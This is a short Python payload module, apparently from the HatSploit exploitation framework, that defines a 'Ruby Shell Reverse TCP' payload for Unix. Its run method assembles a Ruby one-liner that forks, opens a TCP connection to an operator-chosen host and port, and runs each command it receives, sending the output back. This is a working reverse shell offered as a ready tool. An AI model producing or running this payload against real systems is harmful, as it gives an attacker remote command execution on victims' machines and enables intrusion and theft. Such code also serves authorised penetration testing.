#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "singler",
        'Name': "Ruby Shell Reverse TCP",
        'Payload': "unix/generic/ruby_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Ruby shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + remote_host + "\",\"" + remote_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        return payload
